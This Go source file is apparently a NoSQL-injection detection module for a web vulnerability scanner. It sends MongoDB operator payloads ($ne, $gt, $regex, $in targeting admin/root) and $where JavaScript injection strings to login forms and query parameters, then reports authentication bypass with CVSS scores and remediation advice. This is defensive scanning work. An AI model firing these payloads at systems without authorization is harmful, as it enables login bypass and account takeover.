// Package nosql detects NoSQL injection vulnerabilities targeting MongoDB,
// Redis, and CouchDB. Tests operator injection ($ne, $gt, $regex, $where),
// array-based parameter pollution, and JSON body manipulation.
package nosql

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"github.com/erebus/scanner/internal/client"
	"github.com/erebus/scanner/internal/crawler"
	"github.com/erebus/scanner/internal/modules"
)

// authBypassProbes test MongoDB operator injection for authentication bypass.
// Each probe sends a modified parameter value and checks whether login succeeded.
type authProbe struct {
	suffix   string // appended to param name for array style: user[$ne]
	value    string
	operator string
}

var operatorProbes = []authProbe{
	{"[$ne]", "invalid", "$ne (not-equal bypass)"},
	{"[$gt]", "", "$gt (greater-than empty)"},
	{"[$regex]", ".*", "$regex (match-all regex)"},
	{"[$ne]", "x", "$ne string"},
}

// jsonOperatorBodies are complete JSON request body templates for POST JSON auth endpoints
var jsonOperatorBodies = []struct {
	usernameVal interface{}
	passwordVal interface{}
	label       string
}{
	{map[string]interface{}{"$ne": ""}, map[string]interface{}{"$ne": ""}, "username{$ne} + password{$ne}"},
	{map[string]interface{}{"$gt": ""}, map[string]interface{}{"$gt": ""}, "username{$gt} + password{$gt}"},
	{map[string]interface{}{"$regex": ".*"}, map[string]interface{}{"$regex": ".*"}, "username{$regex:.*} + password{$regex:.*}"},
	{"admin", map[string]interface{}{"$ne": "invalid"}, "username=admin + password{$ne}"},
	{"admin", map[string]interface{}{"$exists": true}, "username=admin + password{$exists}"},
	{map[string]interface{}{"$in": []string{"admin", "administrator", "root"}}, map[string]interface{}{"$ne": ""}, "$in[admin,root] + password{$ne}"},
}

// wherePayloads test MongoDB $where operator injection (JavaScript execution)
var wherePayloads = []string{
	"'; return 1==1; var a='",
	"'; return true; var a='",
	"x'; return true //",
	"1'; return 1 //",
}

type Module struct {
	client *client.Client
}

func New(c *client.Client) *Module { return &Module{client: c} }
func (m *Module) Name() string     { return "nosql" }

func (m *Module) Run(ctx context.Context, page crawler.Page) ([]modules.Finding, error) {
	var findings []modules.Finding

	// Test login/auth forms with operator injection
	for _, form := range page.Forms {
		if !isAuthForm(form) {
			continue
		}

		// Array-style operator injection (?user[$ne]=x)
		if f := m.testFormOperators(ctx, form, page.Body); f != nil {
			findings = append(findings, *f)
		}

		// JSON body operator injection (POST with application/json)
		if form.Method == "POST" {
			findings = append(findings, m.testJSONOperators(ctx, form, page.Body)...)
		}

		// $where JavaScript injection
		if f := m.testWhere(ctx, form, page.Body); f != nil {
			findings = append(findings, *f)
		}
	}

	// Test URL params for operator injection (GET requests)
	if u, err := url.Parse(page.URL); err == nil {
		findings = append(findings, m.testQueryOperators(ctx, page.URL, u, page.Body)...)
	}

	// Test all parameters for generic NoSQL error patterns
	findings = append(findings, m.testErrorPatterns(ctx, page)...)

	return findings, nil
}

func (m *Module) testFormOperators(ctx context.Context, form crawler.Form, baseline []byte) *modules.Finding {
	baselineLen := len(baseline)

	// Find username and password fields
	var userField, passField string
	for _, f := range form.Fields {
		low := strings.ToLower(f.Name)
		if userField == "" && isUserField(low) {
			userField = f.Name
		}
		if passField == "" && isPassField(low) {
			passField = f.Name
		}
	}
	if userField == "" && passField == "" {
		return nil
	}

	for _, probe := range operatorProbes {
		if ctx.Err() != nil {
			return nil
		}

		vals := make(url.Values)
		for _, f := range form.Fields {
			if f.Value != "" {
				vals.Set(f.Name, f.Value)
			} else {
				vals.Set(f.Name, "test")
			}
		}

		// Replace username and password with operator-injected versions
		// Array notation: user[$ne]=invalid
		targetField := userField
		if userField == "" {
			targetField = passField
		}
		injectedKey := targetField + probe.suffix

		// Remove original key, add injected key
		vals.Del(targetField)
		vals.Set(injectedKey, probe.value)
		if passField != "" && passField != targetField {
			vals.Del(passField)
			vals.Set(passField+probe.suffix, probe.value)
		}

		req, err := http.NewRequestWithContext(ctx, form.Method, form.Action, strings.NewReader(vals.Encode()))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := m.client.Do(req)
		if err != nil {
			continue
		}
		body, _ := client.ReadBody(resp)

		if isAuthBypass(resp.StatusCode, string(body), baselineLen) {
			return &modules.Finding{
				Module:  "nosql",
				Severity: modules.Critical,
				URL:     form.Action,
				Param:   targetField + probe.suffix,
				Payload: probe.value,
				Evidence: fmt.Sprintf("NoSQL operator injection (%s): HTTP %d, %d bytes — authentication bypassed",
					probe.operator, resp.StatusCode, len(body)),
				Detail: fmt.Sprintf("NoSQL injection via MongoDB operator %s: replacing the '%s' field with an operator "+
					"object bypasses authentication. The application passes unsanitized user input directly to the MongoDB "+
					"query, allowing operator injection. Attacker can log in as any user without knowing their password.",
					probe.operator, targetField),
				CWE:         "CWE-943",
				CVSS:        9.8,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				Confidence:  modules.Confirmed,
				Remediation: "Sanitize and type-check all inputs before passing to MongoDB queries; use mongoose schema validation; explicitly reject object/array types for string fields; use $eq operator explicitly",
				Tags:        []string{"injection", "nosql", "mongodb", "auth-bypass", "operator-injection"},
			}
		}
	}
	return nil
}

func (m *Module) testJSONOperators(ctx context.Context, form crawler.Form, baseline []byte) []modules.Finding {
	var findings []modules.Finding
	baselineLen := len(baseline)

	// Find field names from form
	var userField, passField string
	for _, f := range form.Fields {
		low := strings.ToLower(f.Name)
		if userField == "" && isUserField(low) {
			userField = f.Name
		}
		if passField == "" && isPassField(low) {
			passField = f.Name
		}
	}

	if userField == "" && passField == "" {
		return nil
	}

	for _, probe := range jsonOperatorBodies {
		if ctx.Err() != nil {
			break
		}

		body := make(map[string]interface{})
		// Fill from form fields
		for _, f := range form.Fields {
			if f.Value != "" {
				body[f.Name] = f.Value
			} else {
				body[f.Name] = "test"
			}
		}

		if userField != "" {
			body[userField] = probe.usernameVal
		}
		if passField != "" {
			body[passField] = probe.passwordVal
		}

		encoded, err := json.Marshal(body)
		if err != nil {
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, form.Action, strings.NewReader(string(encoded)))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		resp, err := m.client.Do(req)
		if err != nil {
			continue
		}
		respBody, _ := client.ReadBody(resp)

		if isAuthBypass(resp.StatusCode, string(respBody), baselineLen) {
			findings = append(findings, modules.Finding{
				Module:  "nosql",
				Severity: modules.Critical,
				URL:     form.Action,
				Param:   "JSON body",
				Payload: string(encoded),
				Evidence: fmt.Sprintf("NoSQL JSON operator injection (%s): HTTP %d — authentication bypassed",
					probe.label, resp.StatusCode),
				Detail: fmt.Sprintf("NoSQL injection via JSON operator (%s): passing MongoDB operator objects in the "+
					"JSON request body bypasses authentication. The application deserializes user JSON input and passes "+
					"it directly to MongoDB — operator injection is possible.", probe.label),
				CWE:         "CWE-943",
				CVSS:        9.8,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				Confidence:  modules.Confirmed,
				Remediation: "Validate that username/password fields are strings (not objects) before querying; use strict schema validation; sanitize with a library like mongo-sanitize",
				Tags:        []string{"injection", "nosql", "mongodb", "json-injection", "auth-bypass"},
			})
			break
		}
	}
	return findings
}

func (m *Module) testWhere(ctx context.Context, form crawler.Form, baseline []byte) *modules.Finding {
	baselineLen := len(baseline)

	for _, payload := range wherePayloads {
		if ctx.Err() != nil {
			return nil
		}
		vals := make(url.Values)
		for _, f := range form.Fields {
			vals.Set(f.Name, f.Value)
		}
		// Inject $where payload into first string field
		for _, f := range form.Fields {
			if f.Type != "hidden" && f.Type != "submit" {
				vals.Set(f.Name, payload)
				break
			}
		}
		vals.Set("$where", "1==1")

		req, err := http.NewRequestWithContext(ctx, form.Method, form.Action, strings.NewReader(vals.Encode()))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := m.client.Do(req)
		if err != nil {
			continue
		}
		body, _ := client.ReadBody(resp)

		bodyLow := strings.ToLower(string(body))
		if strings.Contains(bodyLow, "bsontype") || strings.Contains(bodyLow, "jscode") ||
			strings.Contains(bodyLow, "$where") || isAuthBypass(resp.StatusCode, string(body), baselineLen) {
			return &modules.Finding{
				Module:   "nosql",
				Severity: modules.Critical,
				URL:      form.Action,
				Param:    "$where",
				Payload:  payload,
				Evidence: fmt.Sprintf("$where operator injection: HTTP %d, %d bytes — potential JS execution", resp.StatusCode, len(body)),
				Detail:      "MongoDB $where JavaScript injection: a JavaScript expression in the $where parameter was accepted by the server. This allows arbitrary JavaScript execution within MongoDB's JS engine — authentication bypass, data exfiltration, and DoS are possible.",
				CWE:         "CWE-943",
				CVSS:        9.8,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				Confidence:  modules.Likely,
				Remediation: "Disable the $where operator in MongoDB (--noscripting); never pass user-controlled values to $where; validate and sanitize all inputs",
				Tags:        []string{"injection", "nosql", "mongodb", "$where", "js-injection"},
			}
		}
	}
	return nil
}

func (m *Module) testQueryOperators(ctx context.Context, rawURL string, u *url.URL, baseline []byte) []modules.Finding {
	var findings []modules.Finding
	baselineLen := len(baseline)

	for k, vs := range u.Query() {
		if len(vs) == 0 {
			continue
		}
		low := strings.ToLower(k)
		if !isUserField(low) && !isPassField(low) && !strings.Contains(low, "id") && !strings.Contains(low, "filter") {
			continue
		}

		for _, probe := range operatorProbes {
			if ctx.Err() != nil {
				return findings
			}
			q := u.Query()
			q.Del(k)
			q.Set(k+probe.suffix, probe.value)
			cu := *u
			cu.RawQuery = q.Encode()

			req, err := http.NewRequestWithContext(ctx, http.MethodGet, cu.String(), nil)
			if err != nil {
				continue
			}
			resp, err := m.client.Do(req)
			if err != nil {
				continue
			}
			body, _ := client.ReadBody(resp)

			if isAuthBypass(resp.StatusCode, string(body), baselineLen) {
				findings = append(findings, modules.Finding{
					Module:  "nosql",
					Severity: modules.High,
					URL:     rawURL,
					Param:   k + probe.suffix,
					Payload: probe.value,
					Evidence: fmt.Sprintf("NoSQL query operator injection (%s): HTTP %d — access control bypass",
						probe.operator, resp.StatusCode),
					Detail:      fmt.Sprintf("NoSQL query operator injection in GET parameter %q — MongoDB filter bypass via %s", k, probe.operator),
					CWE:         "CWE-943",
					CVSS:        8.8,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
					Confidence:  modules.Confirmed,
					Remediation: "Sanitize query parameters; reject object/array values for fields expecting scalar types; use explicit $eq operators",
					Tags:        []string{"injection", "nosql", "mongodb", "query-injection"},
				})
				break
			}
		}
	}
	return findings
}

func (m *Module) testErrorPatterns(ctx context.Context, page crawler.Page) []modules.Finding {
	var findings []modules.Finding
	errorPatterns := []string{
		"MongoError", "BulkWriteError", "MongoParseError", "MongoNetworkError",
		"MongoServerError", "CastError", "ValidatorError", "DocumentNotFoundError",
		"redis_version", "WRONGTYPE Operation", "+PONG",
		"CouchDB", "_design/", "all_docs",
	}

	body := strings.ToLower(string(page.Body))
	for _, pattern := range errorPatterns {
		if strings.Contains(body, strings.ToLower(pattern)) {
			findings = append(findings, modules.Finding{
				Module:   "nosql",
				Severity: modules.Medium,
				URL:      page.URL,
				Param:    "response body",
				Evidence: fmt.Sprintf("NoSQL error/fingerprint: %q found in response", pattern),
				Detail:      fmt.Sprintf("NoSQL database error/fingerprint leaked in response: %q. This reveals the database technology and may indicate improper error handling that could be exploited for injection.", pattern),
				CWE:         "CWE-209",
				CVSS:        5.3,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
				Confidence:  modules.Potential,
				Remediation: "Suppress verbose database errors in production; use a generic error handler; log errors server-side only",
				Tags:        []string{"nosql", "information-disclosure", "fingerprint"},
			})
			break
		}
	}
	return findings
}

func isAuthForm(form crawler.Form) bool {
	action := strings.ToLower(form.Action)
	if strings.Contains(action, "login") || strings.Contains(action, "signin") ||
		strings.Contains(action, "auth") || strings.Contains(action, "session") {
		return true
	}
	hasUser, hasPass := false, false
	for _, f := range form.Fields {
		low := strings.ToLower(f.Name)
		if isUserField(low) {
			hasUser = true
		}
		if isPassField(low) {
			hasPass = true
		}
	}
	return hasUser && hasPass
}

func isAuthBypass(status int, body string, baselineLen int) bool {
	if status == 200 {
		bodyLow := strings.ToLower(body)
		// Use signals specific enough to indicate a real login success, not generic API responses.
		// Avoided: "auth", "id:", "email:" — these appear in almost every JSON response.
		successSignals := []string{
			"access_token", "refresh_token", "\"token\":", "\"jwt\":",
			"\"dashboard\"", "\"welcome\"", "\"logout\"", "\"logged_in\":true",
			"set-cookie:", "\"session_id\"",
		}
		for _, sig := range successSignals {
			if strings.Contains(bodyLow, sig) {
				return true
			}
		}
		// Response grew significantly relative to a typical error page
		if len(body) > baselineLen+1000 && baselineLen < 500 {
			return true
		}
	}
	return false
}

func isUserField(name string) bool {
	for _, n := range []string{"username", "user", "email", "login", "account", "name", "uid"} {
		if strings.Contains(name, n) {
			return true
		}
	}
	return false
}

func isPassField(name string) bool {
	for _, n := range []string{"password", "pass", "passwd", "pwd", "secret"} {
		if strings.Contains(name, n) {
			return true
		}
	}
	return false
}
